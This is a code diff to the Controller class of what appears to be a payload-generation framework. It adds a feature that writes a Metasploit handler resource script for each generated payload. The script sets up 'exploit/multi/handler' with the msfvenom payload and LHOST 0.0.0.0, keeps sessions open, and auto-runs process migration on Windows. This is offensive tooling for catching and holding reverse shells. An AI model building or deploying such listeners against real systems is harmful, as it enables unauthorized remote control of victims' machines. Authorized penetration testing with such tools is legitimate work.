@@ -305,6 +305,7 @@ class Controller:
     def OutputMenu(self, payload, code, showTitle=True, interactive=True, OutputBaseChoice=""):
         """
         Write a chunk of payload code to a specified ouput file base.
+        Also outputs a handler script if required from the options.
 
         code = the source code to write
         OutputBaseChoice = "payload" or user specified string
@@ -360,6 +361,21 @@ class Controller:
             else:
                 message += "\n Shellcode:\t\t" + payload.shellcode.msfvenompayload
 
+                handler = "use exploit/multi/handler\n"
+                handler += "set PAYLOAD " + payload.shellcode.msfvenompayload + "\n"
+                handler += "set LHOST 0.0.0.0\n"
+                
+                # extract LPORT if it's there
+                p = re.compile('LPORT=(.*?) ')
+                parts = p.findall(payload.shellcode.msfvenomCommand)
+                if len(parts) > 0:
+                    handler += "set LPORT " + parts[0] + "\n"
+
+                handler += "set ExitOnSession false\n"
+                handler += "set AutoRunScript post/windows/manage/migrate\n"
+                handler += "exploit -j\n"
+
+
             # print out any msfvenom options we used in shellcode generation if specified
             if len(payload.shellcode.options) > 0:
                 message += "\n Options:\t\t"
@@ -381,6 +397,14 @@ class Controller:
             message += t.strip()
 
         message += "\n Source File:\t\t"+OutputFileName + "\n"
+
+        # if we're generating the handler script, write it out
+        if settings.GENERATE_HANDLER_SCRIPT:
+            handlerFileName = settings.HANDLER_PATH + FinalBaseChoice + "_handler.rc"
+            handlerFile = open(handlerFileName, 'w')
+            handlerFile.write(handler)
+            handlerFile.close()
+            message += " Handler File:\t\t"+handlerFileName + "\n"
 
         # print out notes if set
         if hasattr(payload, 'notes'):
